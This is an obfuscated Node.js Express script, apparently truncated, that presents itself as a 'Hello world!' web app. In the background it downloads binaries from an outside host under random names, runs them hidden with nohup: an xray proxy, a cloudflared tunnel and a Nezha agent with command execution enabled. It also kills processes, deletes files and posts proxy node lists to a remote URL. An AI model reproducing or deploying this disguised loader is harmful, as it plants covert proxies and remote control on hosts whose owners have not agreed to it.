const _0x1045c6=_0x5231;function _0x59f6(){const _0x546cb2=['readdirSync','\x0a\x20\x20tunnel:\x20','close','ARGO_DOMAIN','join','sub','\x20is\x20running','send','\x20>/dev/null\x202>&1','.exe\x20>\x20nul\x202>&1','error','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20>/dev/null\x202>&1\x20&','lucky','match','unlink','4992RVpDZP','\x0avless://','NEZHA_SERVER','\x20is\x20created','/vless-argo','block','catch','arm64','finish','none','statSync','data','text/plain;\x20charset=utf-8','status','\x20already\x20exists','utf-8','2083','PORT','Empowerment\x20success\x20for\x20','eyJhIjoiNTJiNjI1YWU2Mjg5OWY0NDA0NWY3ZTgyOTEwYzViMWYiLCJ0IjoiMzNjMTcwZDQtMjk0OS00OTNjLWI1MGYtYjc4YTk5M2ZiODVjIiwicyI6Ik1qZ3pOV05sTW1VdFlXTTROQzAwTURSbUxUaGhPRGN0TldRNFpqUTFNbUV5TWpFeSJ9','exec','base64','Download\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stringify','2087','?encryption=none&security=tls&sni=','platform','countryCode','CFIP','blackhole','--tls','split','config.json','readFileSync','/api/add-nodes','http://ip-api.com/json/','unlinkSync','https://arm64.ssss.nyc.mn/web','Error\x20reading\x20boot.log:','AUTO_ACCESS','Subscription\x20uploaded\x20successfully','127.0.0.1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','createWriteStream','clear','TunnelSecret','path','has','quic','application/json','pop','Skipping\x20adding\x20automatic\x20access\x20task','web\x20running\x20error:\x20','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','App\x20is\x20running','test','vless','https://arm64.ssss.nyc.mn/v1','ARGO_AUTH','tunnel.yml','length','tcp','./tmp','https://amd64.ssss.nyc.mn/v1','list.txt','rm\x20-rf\x20','/vmess-argo','forEach','freedom','abcdefghijklmnopqrstuvwxyz','then','?security=tls&sni=','CFPORT','floor','Error\x20executing\x20command:\x20','arch','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','chmod','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2053','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','186117TeixKO','util','Unhandled\x20error\x20in\x20startserver:','6702640iYcTbZ','config.yaml','filter','nohup\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','boot.log','substring','from','NAME','Nodes\x20uploaded\x20successfully','set','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20-c\x20\x22','FILE_PATH','8443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','PROJECT_URL','\x0aclient_secret:\x20','automatic\x20access\x20task\x20added\x20successfully','log','tunnel.json','https://amd64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','/api/add-subscriptions','npm\x20running\x20error:\x20','mkdirSync','\x20>\x20nul\x202>&1','message','tls','pipe','express','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','sub.txt','http\x20server\x20is\x20running\x20on\x20port:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','\x0a\x20\x20credentials-file:\x20','amd','/dev/null','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/bot','arm','aarch64','post','2096','del\x20/f\x20/q\x20','https://oooo.serv00.net/add-url','443','Error\x20downloading\x20files:','\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Content-Type','https://arm64.ssss.nyc.mn/agent','8BIqDZB','existsSync','ArgoDomain:','unshift','339882mdXqni','/vmess-argo?ed=2560','php\x20running\x20error:\x20','org','basename','\x20-s\x20','false','NEZHA_PORT','stream','SUB_PATH','response','random','win32','child_process','toString','/tunnel.yml\x20run','NEZHA_KEY','success','/sub.txt\x20saved\x20successfully','3364440kogIra','SERVER_PORT','fileUrl','&path=%2Ftrojan-argo%3Fed%3D2560#','/trojan-argo','writeFileSync','55Pgbssx','/config.json\x20>/dev/null\x202>&1\x20&','vmess','12909060KMrpSQ','Empowerment\x20failed\x20for\x20','listen','pkill\x20-f\x20\x22[','push','UPLOAD_URL','&path=%2Fvless-argo%3Fed%3D2560#','760235obZSkP','\x20failed:\x20'];_0x59f6=function(){return _0x546cb2;};return _0x59f6();}(function(_0x2dd4bf,_0x2f00d2){const _0x678544={_0x590d28:0x156,_0x4a30b7:0x168,_0x99e3d2:0xf5,_0x257c47:0x12f,_0x46562a:0x14c,_0x49933d:0x146},_0x3e90b9=_0x5231,_0x3dcdcb=_0x2dd4bf();while(!![]){try{const _0x2a96f1=-parseInt(_0x3e90b9(_0x678544._0x590d28))/0x1+parseInt(_0x3e90b9(_0x678544._0x4a30b7))/0x2+parseInt(_0x3e90b9(_0x678544._0x99e3d2))/0x3*(-parseInt(_0x3e90b9(_0x678544._0x257c47))/0x4)+-parseInt(_0x3e90b9(_0x678544._0x46562a))/0x5*(-parseInt(_0x3e90b9(0x133))/0x6)+-parseInt(_0x3e90b9(0xf8))/0x7+parseInt(_0x3e90b9(_0x678544._0x49933d))/0x8+parseInt(_0x3e90b9(0x14f))/0x9;if(_0x2a96f1===_0x2f00d2)break;else _0x3dcdcb['push'](_0x3dcdcb['shift']());}catch(_0x1a66c6){_0x3dcdcb['push'](_0x3dcdcb['shift']());}}}(_0x59f6,0x9bed3));const express=require(_0x1045c6(0x117)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1045c6(0x197)),{promisify}=require(_0x1045c6(0xf6)),exec=promisify(require(_0x1045c6(0x140))[_0x1045c6(0x17c)]),{execSync}=require(_0x1045c6(0x140)),UPLOAD_URL=process[_0x1045c6(0x1a1)][_0x1045c6(0x154)]||'',PROJECT_URL=process[_0x1045c6(0x1a1)][_0x1045c6(0x109)]||'',AUTO_ACCESS=process[_0x1045c6(0x1a1)][_0x1045c6(0x190)]||![],FILE_PATH=process[_0x1045c6(0x1a1)][_0x1045c6(0x106)]||_0x1045c6(0xe1),SUB_PATH=process['env'][_0x1045c6(0x13c)]||_0x1045c6(0x15d),PORT=process['env'][_0x1045c6(0x147)]||process['env'][_0x1045c6(0x179)]||0xbb8,UUID=process['env']['UUID']||'0b87ec96-3066-48ec-9d98-27acad9a1386',NEZHA_SERVER=process['env'][_0x1045c6(0x16a)]||'',NEZHA_PORT=process['env'][_0x1045c6(0x13a)]||'',NEZHA_KEY=process[_0x1045c6(0x1a1)][_0x1045c6(0x143)]||'',ARGO_DOMAIN=process[_0x1045c6(0x1a1)][_0x1045c6(0x15b)]||'hkyy2029.eagles.qzz.io',ARGO_AUTH=process[_0x1045c6(0x1a1)][_0x1045c6(0xdd)]||_0x1045c6(0x17b),ARGO_PORT=process[_0x1045c6(0x1a1)]['ARGO_PORT']||0x1f41,CFIP=process[_0x1045c6(0x1a1)][_0x1045c6(0x185)]||'162.211.229.55',CFPORT=process['env'][_0x1045c6(0xeb)]||0xc030,NAME=process[_0x1045c6(0x1a1)][_0x1045c6(0x101)]||_0x1045c6(0x165);function _0x5231(_0x2443c1,_0x18e0b0){const _0x59f609=_0x59f6();return _0x5231=function(_0x523186,_0xf51048){_0x523186=_0x523186-0xdb;let _0x489a37=_0x59f609[_0x523186];return _0x489a37;},_0x5231(_0x2443c1,_0x18e0b0);}!fs[_0x1045c6(0x130)](FILE_PATH)?(fs[_0x1045c6(0x112)](FILE_PATH),console[_0x1045c6(0x10c)](FILE_PATH+_0x1045c6(0x16b))):console[_0x1045c6(0x10c)](FILE_PATH+_0x1045c6(0x176));function generateRandomName(){const _0x1efe0a={_0x3f1ec9:0xe8,_0x4a71d5:0xec},_0x4328ab=_0x1045c6,_0x488bb4=_0x4328ab(_0x1efe0a._0x3f1ec9);let _0x19a8b7='';for(let _0x461280=0x0;_0x461280<0x6;_0x461280++){_0x19a8b7+=_0x488bb4['charAt'](Math[_0x4328ab(_0x1efe0a._0x4a71d5)](Math[_0x4328ab(0x13e)]()*_0x488bb4[_0x4328ab(0xdf)]));}return _0x19a8b7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1045c6(0x15c)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1045c6(0x15c)](FILE_PATH,webName),botPath=path[_0x1045c6(0x15c)](FILE_PATH,botName),subPath=path[_0x1045c6(0x15c)](FILE_PATH,_0x1045c6(0x11a)),listPath=path['join'](FILE_PATH,_0x1045c6(0xe3)),bootLogPath=path[_0x1045c6(0x15c)](FILE_PATH,'boot.log'),configPath=path[_0x1045c6(0x15c)](FILE_PATH,_0x1045c6(0x189));function deleteNodes(){const _0x532006={_0x3dd735:0x130,_0x4a8c84:0x177,_0x1b7c5e:0xfa,_0x23e6f9:0x19a},_0x386be0=_0x1045c6;try{if(!UPLOAD_URL)return;if(!fs[_0x386be0(_0x532006._0x3dd735)](subPath))return;let _0x1a4370;try{_0x1a4370=fs[_0x386be0(0x18a)](subPath,_0x386be0(0x177));}catch{return null;}const _0x4ab35f=Buffer[_0x386be0(0x100)](_0x1a4370,'base64')['toString'](_0x386be0(_0x532006._0x4a8c84)),_0x55d17d=_0x4ab35f['split']('\x0a')[_0x386be0(_0x532006._0x1b7c5e)](_0x342d29=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x386be0(0x1a4)](_0x342d29));if(_0x55d17d[_0x386be0(0xdf)]===0x0)return;return axios[_0x386be0(0x125)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x386be0(0x180)]({'nodes':_0x55d17d}),{'headers':{'Content-Type':_0x386be0(_0x532006._0x23e6f9)}})[_0x386be0(0x16e)](_0xc04874=>{return null;}),null;}catch(_0x172a37){return null;}}function cleanupOldFiles(){const _0x4213ce={_0x4b8fa1:0xe6},_0x103527=_0x1045c6;try{const _0x51740d=fs[_0x103527(0x158)](FILE_PATH);_0x51740d[_0x103527(_0x4213ce._0x4b8fa1)](_0x4cb76a=>{const _0xca79f2=_0x103527,_0x57f6d2=path['join'](FILE_PATH,_0x4cb76a);try{const _0x105a7b=fs[_0xca79f2(0x172)](_0x57f6d2);_0x105a7b['isFile']()&&fs[_0xca79f2(0x18d)](_0x57f6d2);}catch(_0x5719e8){}});}catch(_0x599ae3){}}app[_0x1045c6(0xfd)]('/',function(_0x4b0b24,_0xaa8340){const _0x56d27e=_0x1045c6;_0xaa8340[_0x56d27e(0x15f)]('Hello\x20world!');});async function generateConfig(){const _0x31548f={_0x6814f9:0x16c,_0x3b1c48:0xe5,_0x435474:0x14a,_0xe59b99:0xdb,_0x20e3ff:0x171,_0x4707b0:0xe0,_0x23088f:0x192,_0x4a3c61:0x171,_0x1a2b32:0x16c,_0x5cfb4f:0x11d,_0x365e4d:0x199,_0x362cfa:0x121,_0x1b2541:0x189},_0x56c989=_0x1045c6,_0x4e079a={'log':{'access':_0x56c989(0x120),'error':'/dev/null','loglevel':_0x56c989(0x171)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x56c989(0x171),'fallbacks':[{'dest':0xbb9},{'path':_0x56c989(_0x31548f._0x6814f9),'dest':0xbba},{'path':_0x56c989(_0x31548f._0x3b1c48),'dest':0xbbb},{'path':_0x56c989(_0x31548f._0x435474),'dest':0xbbc}]},'streamSettings':{'network':_0x56c989(0xe0)}},{'port':0xbb9,'listen':_0x56c989(0x192),'protocol':_0x56c989(_0x31548f._0xe59b99),'settings':{'clients':[{'id':UUID}],'decryption':_0x56c989(_0x31548f._0x20e3ff)},'streamSettings':{'network':_0x56c989(_0x31548f._0x4707b0),'security':_0x56c989(_0x31548f._0x20e3ff)}},{'port':0xbba,'listen':_0x56c989(_0x31548f._0x23088f),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x56c989(_0x31548f._0x4a3c61)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x56c989(_0x31548f._0x1a2b32)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56c989(0x115),_0x56c989(0x199)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x56c989(0x192),'protocol':_0x56c989(0x14e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x56c989(_0x31548f._0x3b1c48)}},'sniffing':{'enabled':!![],'destOverride':[_0x56c989(_0x31548f._0x5cfb4f),'tls',_0x56c989(_0x31548f._0x365e4d)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x56c989(0x171),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x56c989(0x115),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x56c989(_0x31548f._0x362cfa)]},'outbounds':[{'protocol':_0x56c989(0xe7),'tag':'direct'},{'protocol':_0x56c989(0x186),'tag':_0x56c989(0x16d)}]};fs[_0x56c989(0x14b)](path[_0x56c989(0x15c)](FILE_PATH,_0x56c989(_0x31548f._0x1b2541)),JSON[_0x56c989(0x180)](_0x4e079a,null,0x2));}function getSystemArchitecture(){const _0xa81774={_0x1bae71:0xee,_0x37680f:0x123,_0xdc468:0x11f},_0x3605cd=_0x1045c6,_0x43220d=os[_0x3605cd(_0xa81774._0x1bae71)]();return _0x43220d===_0x3605cd(0x123)||_0x43220d===_0x3605cd(0x16f)||_0x43220d===_0x3605cd(0x124)?_0x3605cd(_0xa81774._0x37680f):_0x3605cd(_0xa81774._0xdc468);}function downloadFile(_0x4436ae,_0x3c15d1,_0x3438b8){const _0x574e32={_0x217410:0x112,_0x1e1331:0xe9},_0xbdbfad={_0x5ec021:0x137},_0x1f5b23={_0x4d9303:0x116,_0x2c1f26:0x162},_0x206738=_0x1045c6,_0x18b6ef=_0x4436ae;!fs[_0x206738(0x130)](FILE_PATH)&&fs[_0x206738(_0x574e32._0x217410)](FILE_PATH,{'recursive':!![]});const _0x22240f=fs[_0x206738(0x194)](_0x18b6ef);axios({'method':_0x206738(0xfd),'url':_0x3c15d1,'responseType':_0x206738(0x13b)})[_0x206738(_0x574e32._0x1e1331)](_0x1dd4a5=>{const _0x300719={_0x2a1194:0x167,_0x3476e0:0x17e,_0x58e234:0x137,_0x4e9573:0x157,_0x6ebd69:0x162},_0x4e2a42={_0x96b627:0x15a,_0x148379:0x17e,_0x54dc59:0x12b},_0x30c407=_0x206738;_0x1dd4a5[_0x30c407(0x173)][_0x30c407(_0x1f5b23._0x4d9303)](_0x22240f),_0x22240f['on'](_0x30c407(0x170),()=>{const _0x4ae5a3=_0x30c407;_0x22240f[_0x4ae5a3(_0x4e2a42._0x96b627)](),console[_0x4ae5a3(0x10c)](_0x4ae5a3(_0x4e2a42._0x148379)+path[_0x4ae5a3(0x137)](_0x18b6ef)+_0x4ae5a3(_0x4e2a42._0x54dc59)),_0x3438b8(null,_0x18b6ef);}),_0x22240f['on'](_0x30c407(_0x1f5b23._0x2c1f26),_0x238452=>{const _0x268ae5=_0x30c407;fs[_0x268ae5(_0x300719._0x2a1194)](_0x18b6ef,()=>{});const _0x3e3fa9=_0x268ae5(_0x300719._0x3476e0)+path[_0x268ae5(_0x300719._0x58e234)](_0x18b6ef)+_0x268ae5(_0x300719._0x4e9573)+_0x238452[_0x268ae5(0x114)];console[_0x268ae5(_0x300719._0x6ebd69)](_0x3e3fa9),_0x3438b8(_0x3e3fa9);});})['catch'](_0x4a33c1=>{const _0x2fcb76=_0x206738,_0x418c1c=_0x2fcb76(0x17e)+path[_0x2fcb76(_0xbdbfad._0x5ec021)](_0x18b6ef)+_0x2fcb76(0x157)+_0x4a33c1[_0x2fcb76(0x114)];console['error'](_0x418c1c),_0x3438b8(_0x418c1c);});}async function downloadFilesAndRun(){const _0x4bf7af={_0x307566:0xdf,_0x3ae3d4:0x10c,_0x408e7a:0x19b,_0x20656e:0x107,_0x4cbe93:0x181,_0x3a2e84:0x198,_0x327142:0x139,_0x2a31d1:0x10a,_0x52d42d:0x11c,_0x24b250:0xfb,_0x518bf0:0x15e,_0x15af72:0x162,_0x3717cc:0x135,_0x546000:0x107,_0x401adb:0x126,_0x4374dc:0x10c,_0x40e0ac:0xfb,_0x31b0d0:0x166,_0x46fa32:0x1a2,_0x26ddac:0x166,_0x269cc8:0xed},_0x1a912e={_0x588777:0x130},_0xd29d15={_0x32e241:0x148},_0x5d0c82=_0x1045c6,_0x584ab7=getSystemArchitecture(),_0x3d81f9=getFilesForArchitecture(_0x584ab7);if(_0x3d81f9[_0x5d0c82(_0x4bf7af._0x307566)]===0x0){console[_0x5d0c82(_0x4bf7af._0x3ae3d4)](_0x5d0c82(0xf1));return;}const _0x3c4ac4=_0x3d81f9['map'](_0x3f5adb=>{return new Promise((_0x301db5,_0x4dc984)=>{const _0x4c0b9b=_0x5231;downloadFile(_0x3f5adb['fileName'],_0x3f5adb[_0x4c0b9b(_0xd29d15._0x32e241)],(_0x3f4ee4,_0x2f627c)=>{_0x3f4ee4?_0x4dc984(_0x3f4ee4):_0x301db5(_0x2f627c);});});});try{await Promise['all'](_0x3c4ac4);}catch(_0x511e50){console['error'](_0x5d0c82(0x12a),_0x511e50);return;}function _0x5396ce(_0x3aeb8e){const _0x293dce={_0x2ea0c3:0x150,_0x45599f:0x141},_0x4bf314=_0x5d0c82,_0x5da5ff=0x1fd;_0x3aeb8e[_0x4bf314(0xe6)](_0x1e1b88=>{const _0x443844=_0x4bf314;fs[_0x443844(_0x1a912e._0x588777)](_0x1e1b88)&&fs[_0x443844(0xf0)](_0x1e1b88,_0x5da5ff,_0x4a138a=>{const _0x387213=_0x443844;_0x4a138a?console['error'](_0x387213(_0x293dce._0x2ea0c3)+_0x1e1b88+':\x20'+_0x4a138a):console[_0x387213(0x10c)](_0x387213(0x17a)+_0x1e1b88+':\x20'+_0x5da5ff[_0x387213(_0x293dce._0x45599f)](0x8));});});}const _0x5943a3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5396ce(_0x5943a3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xdcc253=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5d0c82(_0x4bf7af._0x408e7a)]():'',_0x50de56=new Set([_0x5d0c82(0x129),_0x5d0c82(_0x4bf7af._0x20656e),_0x5d0c82(0x126),_0x5d0c82(_0x4bf7af._0x4cbe93),_0x5d0c82(0x178),_0x5d0c82(0xf2)]),_0x20659=_0x50de56[_0x5d0c82(_0x4bf7af._0x3a2e84)](_0xdcc253)?'true':_0x5d0c82(_0x4bf7af._0x327142),_0x422642=_0x5d0c82(_0x4bf7af._0x2a31d1)+NEZHA_KEY+_0x5d0c82(0x163)+NEZHA_SERVER+_0x5d0c82(_0x4bf7af._0x52d42d)+_0x20659+_0x5d0c82(0xfc)+UUID;fs['writeFileSync'](path[_0x5d0c82(0x15c)](FILE_PATH,_0x5d0c82(0xf9)),_0x422642);const _0x2d41f4=_0x5d0c82(_0x4bf7af._0x24b250)+phpPath+_0x5d0c82(0x105)+FILE_PATH+_0x5d0c82(0x12c);try{await exec(_0x2d41f4),console[_0x5d0c82(0x10c)](phpName+_0x5d0c82(_0x4bf7af._0x518bf0)),await new Promise(_0x30d3b4=>setTimeout(_0x30d3b4,0x3e8));}catch(_0x31ab82){console[_0x5d0c82(_0x4bf7af._0x15af72)](_0x5d0c82(_0x4bf7af._0x3717cc)+_0x31ab82);}}else{let _0x2d2a09='';const _0x1ee4cb=[_0x5d0c82(0x129),_0x5d0c82(_0x4bf7af._0x546000),_0x5d0c82(_0x4bf7af._0x401adb),_0x5d0c82(0x181),'2083',_0x5d0c82(0xf2)];_0x1ee4cb[_0x5d0c82(0x19e)](NEZHA_PORT)&&(_0x2d2a09=_0x5d0c82(0x187));const _0x46dd20=_0x5d0c82(_0x4bf7af._0x24b250)+npmPath+_0x5d0c82(0x138)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2d2a09+_0x5d0c82(0x19f);try{await exec(_0x46dd20),console[_0x5d0c82(_0x4bf7af._0x4374dc)](npmName+_0x5d0c82(0x15e)),await new Promise(_0x341043=>setTimeout(_0x341043,0x3e8));}catch(_0x58a2e6){console['error'](_0x5d0c82(0x111)+_0x58a2e6);}}}else console[_0x5d0c82(_0x4bf7af._0x4374dc)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x10cbdc=_0x5d0c82(_0x4bf7af._0x40e0ac)+webPath+'\x20-c\x20'+FILE_PATH+_0x5d0c82(0x14d);try{await exec(_0x10cbdc),console[_0x5d0c82(_0x4bf7af._0x3ae3d4)](webName+_0x5d0c82(0x15e)),await new Promise(_0x2ba9a2=>setTimeout(_0x2ba9a2,0x3e8));}catch(_0x191ab7){console[_0x5d0c82(_0x4bf7af._0x15af72)](_0x5d0c82(0x19d)+_0x191ab7);}if(fs[_0x5d0c82(0x130)](botPath)){let _0x5c0d71;if(ARGO_AUTH[_0x5d0c82(_0x4bf7af._0x31b0d0)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c0d71=_0x5d0c82(_0x4bf7af._0x46fa32)+ARGO_AUTH;else ARGO_AUTH[_0x5d0c82(_0x4bf7af._0x26ddac)](/TunnelSecret/)?_0x5c0d71='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5d0c82(0x142):_0x5c0d71=_0x5d0c82(0x104)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5d0c82(0xfb)+botPath+'\x20'+_0x5c0d71+'\x20>/dev/null\x202>&1\x20&'),console[_0x5d0c82(0x10c)](botName+'\x20is\x20running'),await new Promise(_0x410ed3=>setTimeout(_0x410ed3,0x7d0));}catch(_0x56a27d){console['error'](_0x5d0c82(_0x4bf7af._0x269cc8)+_0x56a27d);}}await new Promise(_0x428633=>setTimeout(_0x428633,0x1388));}function getFilesForArchitecture(_0x9e8299){const _0x5675a8={_0x17d0cd:0x122,_0xd9b064:0x10e,_0x21843c:0x123,_0x229b11:0x12e,_0xae1ffa:0x123,_0x31537d:0xe2},_0x3178d7=_0x1045c6;let _0x44de56;_0x9e8299===_0x3178d7(0x123)?_0x44de56=[{'fileName':webPath,'fileUrl':_0x3178d7(0x18e)},{'fileName':botPath,'fileUrl':_0x3178d7(_0x5675a8._0x17d0cd)}]:_0x44de56=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3178d7(_0x5675a8._0xd9b064)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x21c059=_0x9e8299===_0x3178d7(_0x5675a8._0x21843c)?_0x3178d7(_0x5675a8._0x229b11):'https://amd64.ssss.nyc.mn/agent';_0x44de56[_0x3178d7(0x132)]({'fileName':npmPath,'fileUrl':_0x21c059});}else{const _0x3d48a1=_0x9e8299===_0x3178d7(_0x5675a8._0xae1ffa)?_0x3178d7(0xdc):_0x3178d7(_0x5675a8._0x31537d);_0x44de56[_0x3178d7(0x132)]({'fileName':phpPath,'fileUrl':_0x3d48a1});}}return _0x44de56;}function argoType(){const _0x2308fa={_0x51a25c:0x14b,_0x48d7a5:0x159,_0xebba71:0x11e,_0x239007:0x10d,_0x4021b7:0x119},_0x1d3e36=_0x1045c6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d3e36(0x10c)](_0x1d3e36(0xef));return;}if(ARGO_AUTH['includes'](_0x1d3e36(0x196))){fs[_0x1d3e36(_0x2308fa._0x51a25c)](path['join'](FILE_PATH,_0x1d3e36(0x10d)),ARGO_AUTH);const _0x2d529d=_0x1d3e36(_0x2308fa._0x48d7a5)+ARGO_AUTH[_0x1d3e36(0x188)]('\x22')[0xb]+_0x1d3e36(_0x2308fa._0xebba71)+path['join'](FILE_PATH,_0x1d3e36(_0x2308fa._0x239007))+_0x1d3e36(0xf3)+ARGO_DOMAIN+_0x1d3e36(0x108)+ARGO_PORT+_0x1d3e36(_0x2308fa._0x4021b7);fs['writeFileSync'](path[_0x1d3e36(0x15c)](FILE_PATH,_0x1d3e36(0xde)),_0x2d529d);}else console[_0x1d3e36(0x10c)](_0x1d3e36(0xf4));}async function extractDomains(){const _0x2a01ab={_0x3d6872:0xfe,_0x332ac5:0x18d,_0xba5a65:0x15c,_0x3418e4:0x10c,_0xc600d6:0x15e,_0x2a3a12:0x162,_0x40e0bb:0x18f},_0x5f0023={_0x4a4807:0x173,_0x30fed5:0x136,_0x2354c2:0xfd,_0x4bb9fc:0x18c,_0x33caf9:0x173,_0x37ac7c:0x175,_0x1f6e43:0x144,_0x4472d3:0x173,_0x2d0165:0x136},_0x281691={_0x59eaf0:0x13f,_0x3ef86f:0x161,_0x170041:0x152,_0x3cee6c:0xff,_0x47c194:0x1a0},_0x2c1502=_0x1045c6;let _0x1bcdc4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1bcdc4=ARGO_DOMAIN,console[_0x2c1502(0x10c)]('ARGO_DOMAIN:',_0x1bcdc4),await _0x55bc73(_0x1bcdc4);else try{const _0x1fe5a5=fs[_0x2c1502(0x18a)](path[_0x2c1502(0x15c)](FILE_PATH,_0x2c1502(_0x2a01ab._0x3d6872)),_0x2c1502(0x177)),_0xccc148=_0x1fe5a5[_0x2c1502(0x188)]('\x0a'),_0x57d5ab=[];_0xccc148[_0x2c1502(0xe6)](_0x987ded=>{const _0x2c578e=_0x2c1502,_0x2aa9bc=_0x987ded[_0x2c578e(0x166)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2aa9bc){const _0x4ad953=_0x2aa9bc[0x1];_0x57d5ab['push'](_0x4ad953);}});if(_0x57d5ab['length']>0x0)_0x1bcdc4=_0x57d5ab[0x0],console['log'](_0x2c1502(0x131),_0x1bcdc4),await _0x55bc73(_0x1bcdc4);else{console[_0x2c1502(0x10c)](_0x2c1502(0x193)),fs[_0x2c1502(_0x2a01ab._0x332ac5)](path[_0x2c1502(_0x2a01ab._0xba5a65)](FILE_PATH,_0x2c1502(0xfe)));async function _0x4b7923(){const _0xc745d9=_0x2c1502;try{process['platform']===_0xc745d9(_0x281691._0x59eaf0)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xc745d9(_0x281691._0x3ef86f)):await exec(_0xc745d9(_0x281691._0x170041)+botName['charAt'](0x0)+']'+botName[_0xc745d9(_0x281691._0x3cee6c)](0x1)+_0xc745d9(_0x281691._0x47c194));}catch(_0x4a27d7){}}_0x4b7923(),await new Promise(_0x466820=>setTimeout(_0x466820,0xbb8));const _0x224199='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2c1502(0x17f)+ARGO_PORT;try{await exec(_0x2c1502(0xfb)+botPath+'\x20'+_0x224199+_0x2c1502(0x164)),console[_0x2c1502(_0x2a01ab._0x3418e4)](botName+_0x2c1502(_0x2a01ab._0xc600d6)),await new Promise(_0x434611=>setTimeout(_0x434611,0xbb8)),await extractDomains();}catch(_0x202198){console[_0x2c1502(0x162)]('Error\x20executing\x20command:\x20'+_0x202198);}}}catch(_0x382046){console[_0x2c1502(_0x2a01ab._0x2a3a12)](_0x2c1502(_0x2a01ab._0x40e0bb),_0x382046);}async function _0xca90f1(){const _0x4fea2f=_0x2c1502;try{const _0x3d70a9=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3d70a9[_0x4fea2f(_0x5f0023._0x4a4807)]&&_0x3d70a9['data']['country_code']&&_0x3d70a9[_0x4fea2f(_0x5f0023._0x4a4807)][_0x4fea2f(_0x5f0023._0x30fed5)])return _0x3d70a9[_0x4fea2f(0x173)]['country_code']+'_'+_0x3d70a9[_0x4fea2f(0x173)]['org'];}catch(_0x272b2d){try{const _0x1f80a2=await axios[_0x4fea2f(_0x5f0023._0x2354c2)](_0x4fea2f(_0x5f0023._0x4bb9fc),{'timeout':0xbb8});if(_0x1f80a2[_0x4fea2f(_0x5f0023._0x33caf9)]&&_0x1f80a2['data'][_0x4fea2f(_0x5f0023._0x37ac7c)]===_0x4fea2f(_0x5f0023._0x1f6e43)&&_0x1f80a2[_0x4fea2f(0x173)][_0x4fea2f(0x184)]&&_0x1f80a2[_0x4fea2f(_0x5f0023._0x4472d3)][_0x4fea2f(_0x5f0023._0x2d0165)])return 